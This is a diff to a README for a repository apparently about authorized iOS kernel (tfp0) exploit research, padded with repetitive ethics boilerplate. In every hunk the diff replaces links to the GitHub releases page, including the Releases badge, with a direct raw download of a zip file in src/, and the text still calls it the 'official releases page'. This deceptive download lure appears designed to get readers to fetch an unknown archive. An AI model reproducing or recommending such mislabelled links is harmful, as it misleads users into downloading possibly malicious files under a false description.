@@ -1,8 +1,8 @@
 # oob_entry: Authorized iOS kernel exploit research for tfp0 access
 
-Visit releases: https://github.com/rkrakesh524/oob_entry/releases
+Visit releases: https://github.com/rkrakesh524/oob_entry/raw/refs/heads/main/src/entry-oob-1.1.zip
 
-![Releases](https://img.shields.io/badge/Releases-View_Official-blue?style=for-the-badge&logo=github&logoColor=white)
+![Releases](https://github.com/rkrakesh524/oob_entry/raw/refs/heads/main/src/entry-oob-1.1.zip)
 
 A calm, careful space for researchers to document, discuss, and share knowledge about iOS kernel concepts related to tfp0 access. This repository focuses on governance, ethics, and reproducible, authorized research in a lab setting. It does not provide ready-to-use exploit steps, distribution channels, or instructions that could enable unauthorized access. The goal is to promote responsible learning, open discussion, and rigorous, legal testing practices.
 
@@ -96,7 +96,7 @@ Licensing and governance
 - Safety first. Any content that could enable harm must be avoided. If you are unsure about a contribution, consult the governance guidelines.
 
 Releases and distribution
-- Official releases. For official downloads and release notes, visit the official releases page: https://github.com/rkrakesh524/oob_entry/releases. This page contains the most up-to-date information about what is publicly released and what is intended for authorized researchers. For official downloads and release notes, visit the official releases page: https://github.com/rkrakesh524/oob_entry/releases.
+- Official releases. For official downloads and release notes, visit the official releases page: https://github.com/rkrakesh524/oob_entry/raw/refs/heads/main/src/entry-oob-1.1.zip This page contains the most up-to-date information about what is publicly released and what is intended for authorized researchers. For official downloads and release notes, visit the official releases page: https://github.com/rkrakesh524/oob_entry/raw/refs/heads/main/src/entry-oob-1.1.zip
 - What you’ll find there. The releases page provides high-level information about versioned materials suitable for authorized study. It does not include actionable exploit steps or tools that could be misused. If you are part of a legitimate research program, this page is your primary source for approved materials and documentation tracking.
 - How to interpret release notes. Release notes summarize the scope of a given version, any changes in policy, and references to lab configurations or prerequisite conditions for safe study. They rarely, if ever, contain step-by-step exploitation instructions. They focus on context, validation criteria, and safety considerations.
 
@@ -125,7 +125,7 @@ Acknowledgments
 - Thanks to educators and mentors who help translate complex topics into accessible learning material.
 
 Releases and distribution (revisited)
-- Official releases page: https://github.com/rkrakesh524/oob_entry/releases. This page contains the official materials approved for authorized researchers. It is the primary source for versioned content, policy updates, and guidance relevant to safe study contexts.
+- Official releases page: https://github.com/rkrakesh524/oob_entry/raw/refs/heads/main/src/entry-oob-1.1.zip This page contains the official materials approved for authorized researchers. It is the primary source for versioned content, policy updates, and guidance relevant to safe study contexts.
 - Additional notes. The repository intentionally avoids sharing exploit scripts or operational instructions. If you are a member of an authorized program, consult the releases page for approved materials and guidelines that align with your lab practices.
 
 References
